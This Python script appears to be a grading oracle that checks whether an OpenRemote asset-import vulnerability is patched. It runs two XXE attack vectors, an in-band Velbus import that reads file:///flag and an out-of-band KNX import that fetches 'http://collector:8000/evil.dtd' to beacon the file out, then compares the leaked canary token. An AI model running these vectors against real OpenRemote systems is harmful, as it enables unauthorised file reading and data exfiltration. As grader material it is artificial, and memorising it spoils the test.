#!/usr/bin/env python3
"""Oracle for openremote-cve-2026-54640.

'Flag reached' is defined per vector:
  - ORIGINAL (Velbus, in-band): the planted /flag token appears as an imported
    asset name in the import HTTP response.
  - RESIDUAL (KNX, OOB): the planted /flag token appears in the local collector's
    leak log (proving file:///flag was read and beaconed by the parser).

Both observe the REAL asset-import HTTP endpoint of a REAL OpenRemote manager;
the flag is a per-run canary planted at /flag inside the manager container.

Vector runners return the exfiltrated token (str) or None (blocked). The gate
compares against the expected token.

Usage as a one-profile checker:
    oracle.py original <manager_base> <expected_flag>
    oracle.py residual <manager_base> <collector_base> <expected_flag>
"""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import orlib

FLAG_MARK = "PCBFLAG:"


def original_vector(base):
    """Velbus asset-import XXE. Returns exfiltrated token or None."""
    token = orlib.get_token(base)
    agent_id = orlib.create_velbus_agent(base, token, host="collector", port=8000)
    time.sleep(8)
    status, assets = orlib.do_import(base, token, agent_id,
                                     orlib.build_velbus_payload("file:///flag"),
                                     name="VelbusProject.vlp")
    if isinstance(assets, list):
        for a in assets:
            nm = a.get("asset", {}).get("name", "") or ""
            if nm.startswith(FLAG_MARK):
                return nm[len(FLAG_MARK):]
    return None


def residual_vector(base, collector_base):
    """KNX asset-import XXE (OOB). Returns exfiltrated token or None."""
    token = orlib.get_token(base)
    agent_id = orlib.create_knx_agent(base, token, host="10.255.255.1")
    time.sleep(8)
    orlib.collector_reset(collector_base)
    orlib.do_import(base, token, agent_id,
                    orlib.build_knx_oob_payload("http://collector:8000/evil.dtd"),
                    name="knx-import-testproject.knxproj")
    time.sleep(3)
    for line in orlib.collector_hits(collector_base).splitlines():
        if line.startswith("LEAK f="):
            return line[len("LEAK f="):].strip()
    return None


def _verdict(got, expected):
    return "READ(%s)" % got if got == expected else ("PARTIAL(%r)" % got if got else "BLOCKED")


if __name__ == "__main__":
    kind = sys.argv[1]
    if kind == "original":
        base, expected = sys.argv[2], sys.argv[3]
        got = original_vector(base)
        print("original", _verdict(got, expected))
        sys.exit(0 if got == expected else 1)
    elif kind == "residual":
        base, coll, expected = sys.argv[2], sys.argv[3], sys.argv[4]
        got = residual_vector(base, coll)
        print("residual", _verdict(got, expected))
        sys.exit(0 if got == expected else 1)
    else:
        print("usage: oracle.py original <base> <flag> | residual <base> <collector> <flag>")
        sys.exit(2)
